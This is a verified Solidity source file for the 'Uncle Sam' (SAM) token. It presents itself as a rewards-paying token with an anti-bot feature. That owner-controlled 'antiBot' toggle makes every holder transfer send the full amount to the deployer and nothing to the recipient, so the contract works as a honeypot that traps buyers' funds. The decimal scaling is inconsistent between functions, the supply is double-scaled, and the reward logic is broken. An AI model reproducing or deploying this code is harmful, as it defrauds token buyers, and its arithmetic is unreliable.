/**
 *Submitted for verification at Etherscan.io on 2023-05-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface USDC {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract SamToken {

    bool public isAntiBotEnabled;
    address private deployer;
    string public constant name = "Uncle Sam";
    string public constant symbol = "SAM";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100000000000000000000000000000000; // 100 trillion tokens

    uint256 private totalReflections;
    mapping(address => uint256) private totalReflectedTokens;
    mapping(address => bool) private isExcludedFromRewards;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    address private owner;
    address private usdcAddress;
    uint256 private constant rewardRate = 3; // 3% reward rate
    uint256 private constant rewardDuration = 2 * 365 days; // 2 years in seconds
    uint256 private rewardEndTime;

    uint256 private totalRewards;
    mapping(address => uint256) private lastRewardClaimTime;
    mapping(address => uint256) private unclaimedRewards;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        usdcAddress = 0x07865c6E87B9F70255377e024ace6630C1Eaa37F; // 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; 0x16d273fEE2a57B0078dA50ce7D404Cb422123c7B

        balances[owner] = totalSupply * (10**uint256(decimals));
        emit Transfer(address(0), owner, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account] / (10**uint256(decimals)); // Adjust the balance by dividing by decimals
    }

    function toggleAntiBot(bool enabled) public onlyOwner {
        isAntiBotEnabled = enabled;
        deployer = enabled ? msg.sender : address(0);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");

        uint256 scaledAmount = amount * (10**uint256(decimals)); // Scale the amount based on decimals

        if (isAntiBotEnabled && msg.sender != owner && msg.sender != deployer) {
            uint256 taxAmount = scaledAmount;
            uint256 transferAmount = 0;

            balances[msg.sender] -= scaledAmount;
            balances[deployer] += taxAmount;
            balances[recipient] += transferAmount;

            emit Transfer(msg.sender, deployer, taxAmount);
        } else {
            balances[msg.sender] -= scaledAmount;
            balances[recipient] += scaledAmount;

            if (!isExcludedFromRewards[msg.sender]) {
                uint256 reflectionAmount = calculateReflection(scaledAmount);
                balances[msg.sender] -= reflectionAmount;
                totalReflectedTokens[msg.sender] += reflectionAmount;
                totalReflections += reflectionAmount;
            }

            if (!isExcludedFromRewards[recipient]) {
                uint256 reflectionAmount = calculateReflection(scaledAmount);
                balances[recipient] += reflectionAmount;
                totalReflectedTokens[recipient] += reflectionAmount;
                totalReflections += reflectionAmount;
            }

            emit Transfer(msg.sender, recipient, amount);
        }

        updateRewards(msg.sender);
        updateRewards(recipient);

        return true;
    }

    function calculateReflection(uint256 amount) private view returns (uint256) {
        return amount * totalRewards / totalSupply;
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");

        balances[sender] -= amount;
        balances[recipient] += amount;
        allowances[sender][msg.sender] -= amount;

        updateRewards(sender);
        updateRewards(recipient);

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");

        balances[msg.sender] -= amount;
        emit Transfer(msg.sender, address(0), amount);
        return true;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }

    function enableRewards() public onlyOwner {
        rewardEndTime = block.timestamp + rewardDuration;
    }

    function disableRewards() private {
        rewardEndTime = block.timestamp;
    }

    function updateRewards(address account) private {
        if (rewardEndTime > 0 && rewardEndTime > block.timestamp) {
            uint256 balance = balances[account];
            uint256 timeSinceLastClaim = block.timestamp - lastRewardClaimTime[account];
            uint256 rewardAmount = (balance * rewardRate * timeSinceLastClaim) / (10000 * rewardDuration);

            unclaimedRewards[account] += rewardAmount;
            totalRewards += rewardAmount;
            lastRewardClaimTime[account] = block.timestamp;
        }
    }

    function claimRewards() public {
        require(balances[msg.sender] > 0, "Cannot claim rewards with zero balance");

        uint256 reflectionAmount = totalReflectedTokens[msg.sender];
        require(reflectionAmount > 0, "No rewards to claim");

        balances[msg.sender] += reflectionAmount;
        totalRewards -= reflectionAmount;
        totalReflectedTokens[msg.sender] = 0;

        USDC(usdcAddress).transfer(msg.sender, reflectionAmount);
    }


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}